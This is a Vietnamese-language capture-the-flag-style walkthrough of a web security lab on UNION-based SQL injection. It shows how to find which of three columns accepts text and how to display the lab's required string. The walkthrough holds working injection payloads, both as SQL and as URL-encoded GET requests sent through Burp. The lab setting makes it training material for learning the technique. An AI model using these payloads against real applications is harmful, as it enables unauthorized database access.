# SQL Injection Lab 08: UNION Attack - Finding a Column Containing Text

## Mục tiêu
Xác định cột nào hỗ trợ kiểu dữ liệu text, sau đó hiển thị chuỗi yêu cầu của lab: `KOkBKp`.

<img src="images/08_union-text-column-2026-04-14-22-40-05.png" alt="Lab overview" width="760" />

## Các bước thực hiện
1. Dùng kết quả từ lab trước: query có **3 cột**.

2. Xác nhận lại payload `UNION` với 3 `NULL`:

```sql
' union select null, null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20null%2C%20null%20-- HTTP/2
```

<img src="images/08_union-text-column-2026-04-14-22-44-47.png" alt="Three-column union baseline" width="760" />

3. Test cột text bằng cách thay `NULL` bằng chuỗi ở cột 1:

```sql
' union select 'aa', null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20%27aa%27%2C%20null%2C%20null%20-- HTTP/2
```

Kết quả lỗi `Internal Server Error` => cột 1 không phù hợp để chứa string trong ngữ cảnh này.

<img src="images/08_union-text-column-2026-04-14-22-46-32.png" alt="String in column 1 failed" width="760" />

4. Đưa giá trị lab vào cột 2:

```sql
' union select null, 'KOkBKp', null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20%27KOkBKp%27%2C%20null%20-- HTTP/2
```

Response hiển thị `KOkBKp` và lab được solve.

<img src="images/08_union-text-column-2026-04-14-22-47-56.png" alt="Lab solved with text in column 2" width="760" />

## Payload solve

```sql
' union select null, 'KOkBKp', null --
```
